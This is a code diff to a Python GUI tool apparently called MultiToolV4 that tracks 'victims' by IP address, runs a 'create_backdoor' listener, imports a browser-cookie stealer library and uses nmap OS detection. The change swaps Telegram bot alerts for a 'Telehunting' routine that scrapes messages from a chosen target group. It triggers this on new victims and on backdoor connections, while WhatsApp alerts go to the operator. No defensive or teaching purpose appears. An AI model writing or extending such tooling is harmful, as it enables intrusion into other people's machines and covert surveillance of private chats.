@@ -8,13 +8,13 @@ import browser_cookie3
 import autopy
 from PyQt5 import QtWidgets, QtCore
 import requests
-from telethon import TelegramClient
 import pywhatkit as kit
 import facebook
 import openai
 import os
 import sys
 import asyncio
+from telehunting import Telehunting
 
 # ===================== Logging Setup ===================== #
 if not os.path.exists('logs'):
@@ -35,22 +35,17 @@ NMAP_ARGS = "-Pn -sT -O"
 with open('config/api_credentials.json', 'r') as cred_file:
     api_credentials = json.load(cred_file)
 
-API_ID = api_credentials['telegram_api_id']
-API_HASH = api_credentials['telegram_api_hash']
-BOT_TOKEN = api_credentials['telegram_bot_token']
 FACEBOOK_TOKEN = api_credentials['facebook_access_token']
 WHATSAPP_PHONE_NUMBER = api_credentials['whatsapp_phone_number']
+TELEGRAM_USERNAME = api_credentials['telegram_username']  # Telehunting uses your account, not a bot token
 
-# Initialize Telegram Client
-telegram_client = TelegramClient('bot', API_ID, API_HASH)
-
-# Set OpenAI API Key
+# Initialize OpenAI API
 openai.api_key = api_credentials["openai_api_key"]
 
 # ===================== API Key Validation ===================== #
 def validate_api_keys(output_area):
     """Validate that all necessary API keys are provided."""
-    if not all([API_ID, API_HASH, BOT_TOKEN, FACEBOOK_TOKEN, WHATSAPP_PHONE_NUMBER, openai.api_key]):
+    if not all([FACEBOOK_TOKEN, WHATSAPP_PHONE_NUMBER, openai.api_key, TELEGRAM_USERNAME]):
         output_area.append("Error: One or more API keys are missing. Check your config/api_credentials.json file.\n")
         logging.error("Missing API keys.")
         return False
@@ -76,16 +71,6 @@ def detect_and_fix_errors(error_message, output_area):
         logging.error(f"AI detection error: {str(e)}")
 
 # ===================== Bot Notifications ===================== #
-async def telegram_bot_notify(message, output_area):
-    """Send a message to Telegram asynchronously and handle errors."""
-    try:
-        if not telegram_client.is_connected():
-            await telegram_client.start(bot_token=BOT_TOKEN)
-        await telegram_client.send_message('me', message)
-        output_area.append("Telegram notification sent.\n")
-    except Exception as e:
-        handle_exception(e, output_area)
-
 def whatsapp_notify(message, phone_number, output_area):
     """Send a WhatsApp message using pyWhatKit."""
     try:
@@ -104,6 +89,24 @@ def setup_facebook_bot(output_area):
     except Exception as e:
         handle_exception(e, output_area)
 
+# ===================== Telegram Monitoring with Telehunting ===================== #
+async def telegram_hunting(output_area):
+    """Use Telehunting to scrape data from Telegram chats and groups."""
+    try:
+        telehunting = Telehunting(username=TELEGRAM_USERNAME)
+        target_group = 'target_group_id'  # Replace with a target group or channel id
+        await telehunting.connect()
+
+        messages = await telehunting.get_messages(target_group, limit=5)  # Get the last 5 messages
+        output_area.append(f"Monitoring Telegram Group: {target_group}\n")
+        for msg in messages:
+            output_area.append(f"Message: {msg.message}\n")
+
+        await telehunting.disconnect()
+
+    except Exception as e:
+        handle_exception(e, output_area)
+
 # ===================== Victim Monitoring ===================== #
 victims = []
 
@@ -116,9 +119,9 @@ def add_victim(ip_address, output_area):
 
     victims.append(ip_address)
     output_area.append(f"Monitoring victim: {ip_address}\n")
-    
+
     message = f"Vulnerability detected at {ip_address}."
-    asyncio.create_task(telegram_bot_notify(message, output_area))
+    asyncio.create_task(telegram_hunting(output_area))  # Using telegram_hunting for scraping
     whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
 
 def validate_ip(ip):
@@ -149,7 +152,7 @@ def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
         output_area.append(f"Connection established with {addr}\n")
 
         message = f"Backdoor connection established with {addr}"
-        asyncio.create_task(telegram_bot_notify(message, output_area))
+        asyncio.create_task(telegram_hunting(output_area))  # Using telegram_hunting for monitoring
         whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
         
         while not stop_event.is_set():
@@ -242,7 +245,7 @@ class MultiToolV4(QtWidgets.QMainWindow):
             try:
                 message = "Bots connected to APIs."
                 self.bot_output.append(message)
-                asyncio.create_task(telegram_bot_notify("Bots are active.", self.bot_output))
+                asyncio.create_task(telegram_hunting(self.bot_output))  # Using Telehunting for monitoring
                 setup_facebook_bot(self.bot_output)
             except Exception as e:
                 handle_exception(e, self.bot_output)
